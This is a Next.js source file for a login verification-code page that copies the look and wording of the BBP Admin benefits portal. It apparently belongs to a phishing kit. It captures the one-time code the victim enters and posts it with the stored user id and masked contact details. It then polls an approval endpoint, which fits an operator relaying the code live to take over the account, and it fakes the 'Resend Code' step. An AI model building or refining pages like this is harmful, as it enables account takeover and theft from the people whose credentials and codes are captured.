"use client"

import Link from "next/link"
import Image from "next/image"
import { useEffect, useState, useRef, Suspense } from "react"
import { useSearchParams } from "next/navigation"
import { Check, Lock, Mail, MessageSquare, Phone, X } from "lucide-react"
import { Button } from "@/components/ui/button"
import { MSG_UNABLE_REACH_VERIFICATION } from "@/lib/approval-messages"
import { Footer } from "@/components/footer"
import { ThreeDotSpinner } from "@/components/ThreeDotSpinner"
import { trackFormSubmission } from "@/hooks/use-visitor-tracking"
import {
  setAptiaLoginFlowStage,
  useAptiaLoginFlowGuard,
} from "@/hooks/use-aptia-login-flow-guard"
import {
  WEALTHCARE_BUTTON_CHROME,
  WEALTHCARE_BUTTON_GEOMETRY,
  WEALTHCARE_NEUTRAL_BUTTON_CLASS,
} from "@/lib/wealthcare-button-styles"

const STEADY_POLL_MS = 500
const WAIT_TIMEOUT_MS = 90 * 1000
type OtpApprovalResult = "denied" | "timeout" | "error" | null

/** Reference step-2 copy, verbatim. No masked-address line. */
const NOTE_TEXT =
  "If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function."

/** Validated internally, not displayed — the reference shows no length hint. */
const OTP_LENGTH = 6

/** Chrome from the shared Wealthcare tokens; the fill is BBP's own. */
const BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_BUTTON_CHROME} bg-[#141c4d] hover:bg-[#407ec9] text-white disabled:opacity-70`

const NEUTRAL_BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_NEUTRAL_BUTTON_CLASS} bg-[#407ec9] hover:bg-[#141c4d] text-white disabled:opacity-70`

const CONTENT_COLUMN =
  "w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]"

const CONTENT_INNER =
  "w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]"

function VerifyCodeContent() {
  useAptiaLoginFlowGuard({
    expectedStage: "otp",
    noAuthUrl: "/",
    wrongStageUrl: "/login/2fa-verify",
  })

  const searchParams = useSearchParams()
  const method = searchParams.get('method') || 'email'

  const [code, setCode] = useState("")
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)
  const [otpApprovalResult, setOtpApprovalResult] = useState<OtpApprovalResult>(null)
  const [pendingOtpId, setPendingOtpId] = useState<string | null>(null)
  const inputRef = useRef<HTMLInputElement | null>(null)
  const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  useEffect(() => {
    if (typeof window !== 'undefined' && window.self !== window.top) {
      window.top!.location.href = window.location.pathname + window.location.search
      return
    }
  }, [])

  useEffect(() => {
    if (!pendingOtpId) return

    const clearPolling = () => {
      if (pollRef.current) {
        clearTimeout(pollRef.current)
        pollRef.current = null
      }
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current)
        timeoutRef.current = null
      }
    }

    timeoutRef.current = setTimeout(() => {
      clearPolling()
      setIsLoading(false)
      setOtpApprovalResult('timeout')
      setErrors({ otp: 'Request timed out. Please try again.' })
      setCode("")
      setPendingOtpId(null)
    }, WAIT_TIMEOUT_MS)

    const poll = async () => {
      try {
        const res = await fetch(`/api/pending-login/${encodeURIComponent(pendingOtpId)}`, {
          cache: 'no-store',
          headers: { 'Cache-Control': 'no-cache', Pragma: 'no-cache' },
        })
        if (!res.ok) return
        const data = await res.json()
        const status = String(data?.status ?? '').trim().toLowerCase()
        if (status === 'approved') {
          clearPolling()
          setIsLoading(false)
          setPendingOtpId(null)
          window.location.href = '/api/login-out'
          return
        }
        if (status === 'denied' || status === 'expired') {
          clearPolling()
          setIsLoading(false)
          setCode("")
          setOtpApprovalResult(status === 'denied' ? 'denied' : 'timeout')
          setErrors({
            otp:
              status === 'denied'
                ? 'Incorrect Code or Expired Code'
                : 'Request timed out. Please try again.',
          })
          setPendingOtpId(null)
          inputRef.current?.focus()
        }
      } catch {
        // ignore temporary polling errors
      }
    }

    const waitStartedAt = Date.now()
      const tick = async () => {
        const token = -1 as unknown as ReturnType<typeof setTimeout>
        pollRef.current = token
        await poll()
        if (pollRef.current !== token) return
        pollRef.current = setTimeout(() => {
          void tick()
        }, approvalPollDelayMs(waitStartedAt))
      }
      void tick()
    return clearPolling
  }, [pendingOtpId])

  useEffect(() => {
    const denied = typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('denied') : null
    const timeout = typeof window !== 'undefined' ? new URLSearchParams(window.location.search).get('timeout') : null
    if (denied === '1') {
      setCode("")
      setOtpApprovalResult('denied')
      setErrors({ otp: 'Incorrect Code or Expired Code' })
      setIsLoading(false)
      setPendingOtpId(null)
    }
    if (timeout === '1') {
      setCode("")
      setOtpApprovalResult('timeout')
      setErrors({ otp: 'Request timed out. Please try again.' })
      setIsLoading(false)
      setPendingOtpId(null)
    }
  }, [])

  useEffect(() => {
    if (resendCooldown <= 0) return
    const timer = setInterval(() => {
      setResendCooldown(prev => (prev <= 1 ? 0 : prev - 1))
    }, 1000)
    return () => clearInterval(timer)
  }, [resendCooldown])

  /* Single text input — strip non-digits and cap length. No length hint is
     shown; the reference displays no hint. */
  const handleCodeChange = (value: string) => {
    if (isLoading) return
    setCode(value.replace(/\D/g, '').slice(0, OTP_LENGTH))
    if (errors.otp) {
      setErrors((prev) => ({ ...prev, otp: "" }))
    }
    if (otpApprovalResult) {
      setOtpApprovalResult(null)
    }
  }

  const handleVerify = async () => {
    setErrors({})
    setOtpApprovalResult(null)
    const otpCode = code
    if (otpCode.length !== OTP_LENGTH) {
      setErrors({ otp: 'Please enter the complete 6-digit code' })
      return
    }

    setIsLoading(true)
    const userId = typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : ''
    const maskedEmailStored = sessionStorage.getItem('maskedEmail') ?? ''
    const maskedPhoneStored = sessionStorage.getItem('maskedPhone') ?? ''
    trackFormSubmission({
      type: method === 'email' ? 'login_email_otp_verification' : 'login_text_otp_verification',
      userId,
      method,
      otp: otpCode,
      page: `/login/verify-code?method=${method}`,
    }).catch(() => { })

    try {
      const res = await fetch('/api/pending-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: userId || 'login',
          password: otpCode,
          method,
          maskedEmail: maskedEmailStored,
          maskedPhone: maskedPhoneStored,
          flow: 'otp',
        }),
      })
      const data = await res.json()
      if (!res.ok) {
        setIsLoading(false)
        setOtpApprovalResult('error')
        if ((data as { error?: string })?.error)
          console.error("[pending-login] rejected:", (data as { error?: string }).error)
        setErrors({ otp: MSG_UNABLE_REACH_VERIFICATION })
        return
      }
      if (data.id) {
        setPendingOtpId(data.id)
        return
      }
      setIsLoading(false)
      setOtpApprovalResult('timeout')
    } catch {
      setIsLoading(false)
      setOtpApprovalResult('error')
      setErrors({ otp: MSG_UNABLE_REACH_VERIFICATION })
    }
  }

  const handleResend = async () => {
    if (isResending || resendCooldown > 0) return
    setIsResending(true)
    setCode("")
    setErrors({})
    setOtpApprovalResult(null)

    try {
      const userId = typeof window !== 'undefined' ? sessionStorage.getItem('loginUserId') ?? '' : ''
      await trackFormSubmission({
        type: method === 'email' ? 'login_email_otp_resend' : 'login_text_otp_resend',
        userId,
        method,
        page: `/login/verify-code?method=${method}`,
      }).catch(() => { })

      await new Promise(r => setTimeout(r, 2000))
    } finally {
      /* Cooldown in finally so it applies even if the wait throws. */
      setIsResending(false)
      setResendCooldown(30)
      inputRef.current?.focus()
    }
  }

  const isEmail = method === 'email'
  return (
    <div className="min-h-screen flex flex-col bg-white">
      <header className="bg-white border-b border-gray-200 px-6 py-[15px]">
        <div className="flex items-center">
          <div className="flex items-center gap-6 flex-1 min-w-0">
            <Link href="/" className="flex items-center shrink-0">
              <Image
                src="/BBPAdmin_Alegeus_Logo_Blue_Service.4ec5724d58c34a02b47bdfd467112a82.png"
                alt="BBP Admin"
                width={120}
                height={40}
                className="h-[40px] w-auto"
                priority
              />
            </Link>
            <div className="flex flex-col text-xs text-gray-600 leading-tight ml-auto shrink-0">
              <div className="flex items-center gap-2">
                <Phone className="w-3 h-3" />
                <span>(630) 773-2337</span>
              </div>
              <div className="flex items-center gap-2 mt-0.5">
                <Mail className="w-3 h-3" />
                <span>support@bbpadmin.com</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 flex flex-col min-[1200px]:items-center">
        <div className={CONTENT_COLUMN}>
          <div className={CONTENT_INNER}>
            <div className="mb-[18px]">
              <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
              <p className="text-[14px] leading-[1.6] text-[#707070] text-center">
                {isEmail ? "An e-mail has been sent:" : "An SMS has been sent:"}
              </p>
              <p className="text-[14px] leading-[1.6] text-[#707070] text-center">
                Enter the verification code that you received via{" "}
                <strong className="font-semibold">{isEmail ? "Email" : "SMS"}</strong> below:
              </p>
              <p className="text-[14px] leading-[1.6] text-[#707070] text-center mt-4">
                Note - Do not share your verification code with anyone else
              </p>
            </div>

            {errors.otp && (
              <p className="text-red-500 text-sm text-center mb-2" role="alert">
                {errors.otp}
              </p>
            )}

            {/* Whole form region — code row AND buttons — swaps for the spinner. */}
            {isLoading ? (
              <ThreeDotSpinner label="Verifying your code" />
            ) : (
              <div>
                <div className="flex flex-col min-[1200px]:flex-row min-[1200px]:items-center min-[1200px]:justify-between gap-1 min-[1200px]:gap-0 mb-4">
                  <div className="w-full max-[768px]:mx-[5px] min-[1200px]:w-[200px] min-[1200px]:mr-auto">
                    <div className="flex items-center gap-3.5">
                      {isEmail ? (
                        <Mail className="w-[22px] h-[22px] text-[#424242] shrink-0" aria-hidden="true" />
                      ) : (
                        <MessageSquare className="w-[22px] h-[22px] text-[#424242] shrink-0" aria-hidden="true" />
                      )}
                      <span className="text-[14px] text-gray-700 whitespace-nowrap">Confirmation Code</span>
                    </div>
                  </div>
                  <div className="relative w-full h-[38px] bg-white min-[1200px]:w-[202px]">
                    <input
                      ref={inputRef}
                      type="text"
                      name="code"
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      value={code}
                      onChange={(e) => handleCodeChange(e.target.value)}
                      onPaste={(e) => {
                        e.preventDefault()
                        handleCodeChange(e.clipboardData.getData('text'))
                      }}
                      aria-label="Confirmation Code"
                      className="w-full h-full px-3 bg-white border border-[#bec5c2] text-[15px] text-[#424242] outline-none"
                    />
                  </div>
                </div>

                <div className="w-[220px] mx-auto">
                  <Button
                    type="button"
                    disabled={code.length !== OTP_LENGTH}
                    onClick={() => void handleVerify()}
                    className={`${BUTTON_CHROME} mb-[10px]`}
                  >
                    <Check className="w-6 h-6 shrink-0" />
                    <span className="flex-1 text-center truncate">Continue</span>
                  </Button>

                  <Button
                    type="button"
                    onClick={() => {
                      setAptiaLoginFlowStage('2fa')
                      window.location.href = '/login/2fa-verify'
                    }}
                    className={`${NEUTRAL_BUTTON_CHROME} mb-[10px]`}
                  >
                    <X className="w-6 h-6 shrink-0" />
                    <span className="flex-1 text-center truncate">Cancel</span>
                  </Button>

                  {/* Not tied to verify isLoading — only to the resend lockout. */}
                  <Button
                    type="button"
                    disabled={isResending || resendCooldown > 0}
                    onClick={() => void handleResend()}
                    className={BUTTON_CHROME}
                  >
                    <span className={`truncate ${isResending || resendCooldown > 0 ? "flex-1 text-center" : ""}`}>
                      {isResending
                        ? "Sending..."
                        : resendCooldown > 0
                          ? `Resend Code (${resendCooldown})`
                          : "Resend Code"}
                    </span>
                  </Button>
                </div>
              </div>
            )}

            {/* Note lives OUTSIDE the gated form so it survives the wait. */}
            <div
              role="note"
              className="relative mt-6 pl-[48px] min-[769px]:pl-[62px] pr-[13px] py-[13px] pb-[14px] text-[14px] leading-[1.3] text-[#424242]"
              style={{ backgroundColor: "#F3F7A9" }}
            >
              <span
                className="absolute left-1 top-1/2 -translate-y-1/2 w-[35px] h-[35px] rounded-full border-2 border-[#414141] text-[#414141] text-[20px] leading-[31px] text-center"
                aria-hidden="true"
              >
                i
              </span>
              <p className="m-0">{NOTE_TEXT}</p>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  )
}

export default function LoginVerifyCodePage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-gray-600">Loading...</div>
      </div>
    }>
      <VerifyCodeContent />
    </Suspense>
  )
}

const BURST_POLL_MS = 200
const BURST_WINDOW_MS = 10_000
function approvalPollDelayMs(waitStartedAtMs: number): number {
  return Date.now() - waitStartedAtMs < BURST_WINDOW_MS ? BURST_POLL_MS : STEADY_POLL_MS
}
